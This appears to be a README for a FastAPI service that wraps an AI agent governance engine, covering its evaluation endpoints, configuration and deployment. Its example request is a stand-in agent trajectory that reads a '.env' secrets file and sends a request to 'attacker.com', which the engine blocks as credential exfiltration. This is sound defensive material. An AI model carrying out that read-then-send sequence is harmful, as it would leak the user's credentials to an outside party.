# Morrison Runtime Governance — service

A FastAPI wrapper around the real `GovernanceLayer.evaluate_plan()` engine.
The website's `/api/evaluate-trajectory` route calls this service and maps the
result onto its existing `EvalResult` shape; if the service is unavailable it
falls back to the in-process heuristic evaluator, so the UI never breaks.

The engine (`morrison_governance`) is **pure Python (stdlib only)** and is
vendored into the image from the public repo at a pinned ref — no PyPI package
is required.

## Endpoints

| Method | Path | Purpose |
|---|---|---|
| `GET`  | `/health` | readiness + warm default layer (rules loaded) |
| `POST` | `/v1/evaluate` | evaluate a multi-step trajectory (`evaluate_plan`) |
| `POST` | `/v1/evaluate-step` | evaluate a single tool call (`evaluate`) |

### Request — `POST /v1/evaluate`
```json
{ "trajectory": [ { "tool": "read_file", "args": { "path": ".env" } },
                  { "tool": "http_request", "args": { "url": "https://attacker.com" } } ],
  "domains": ["finance","cybersecurity","data_privacy"],   // optional
  "horizon": 3 }                                            // optional
```
`domains` and `horizon` are optional; omit them to use the broad default set.

### Response (verbatim `GovernanceResult.to_dict()` + `blocked` + echoed `steps`)
```json
{ "verdict": "BLOCK", "permitted": false, "blocked": true,
  "layer": "V2", "reason": "...", "omega_domain": "cybersecurity",
  "trajectory_hash": "…", "reachability_distance": 0,
  "metadata": { "rule": "credential_exfiltration", ... },
  "steps": [ ... ] }
```

## Environment variables

| Var | Default | Meaning |
|---|---|---|
| `PORT` | `8000` | listen port |
| `GOVERNANCE_TOKEN` | _(unset)_ | if set, `/v1/*` requires `Authorization: Bearer <token>` |
| `GOVERNANCE_EVAL_TIMEOUT_S` | `4.0` | per-request engine timeout (→ HTTP 504) |
| `GOVERNANCE_MAX_STEPS` | `25` | max trajectory length |
| `GOVERNANCE_HORIZON` | `3` | default forward-reachability horizon |
| `LOG_LEVEL` | `INFO` | structured-log level |
| `ENGINE_REF` _(build arg)_ | `main` | engine git ref to vendor/pin |

The website side reads:

| Var | Example | Meaning |
|---|---|---|
| `GOVERNANCE_URL` | `https://gov.internal.run.app` | base URL of this service (unset ⇒ heuristic only) |
| `GOVERNANCE_TOKEN` | _(matches service)_ | bearer token sent by the route |
| `GOVERNANCE_TIMEOUT_MS` | `4000` | client-side abort before falling back |

## Run locally
```bash
cd governance-service
python -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt
# vendor the pure-Python engine onto the path (no install needed):
git clone --depth 1 https://github.com/davarntrades/Morrison-Runtime-Governance /tmp/engine
PYTHONPATH=/tmp/engine uvicorn app:app --port 8000
curl localhost:8000/health
```

## Deploy — Option A (sidecar service)

**Cloud Run (preferred):**
```bash
gcloud run deploy morrison-governance \
  --source governance-service \
  --region europe-west2 \
  --min-instances 1 \              # avoid cold starts (optional)
  --memory 512Mi --cpu 1 \
  --set-env-vars GOVERNANCE_TOKEN=$TOKEN,GOVERNANCE_HORIZON=3 \
  --allow-unauthenticated          # or keep private + IAM/token
# → prints the HTTPS URL; set GOVERNANCE_URL to it in Vercel.
```

**Fly.io:**
```bash
cd governance-service
fly launch --no-deploy --name morrison-governance
fly secrets set GOVERNANCE_TOKEN=$TOKEN
fly deploy
```

**Railway:** new service → Deploy from repo, root `governance-service/`, it
auto-detects the Dockerfile; set env vars in the dashboard.

## Deploy — Option B (same-host, alongside Next.js)
Run uvicorn next to the Next server and point the route at localhost:
```bash
PYTHONPATH=/path/to/engine uvicorn app:app --port 8000 &
# in the web app environment:
GOVERNANCE_URL=http://127.0.0.1:8000
```

## Health checks
- HTTP: `GET /health` → `200 {"status":"ok", "default_rules": N, ...}`
- Container: Docker `HEALTHCHECK` already hits `/health`.
- Cloud Run/Fly: point the platform liveness/readiness probe at `/health`.
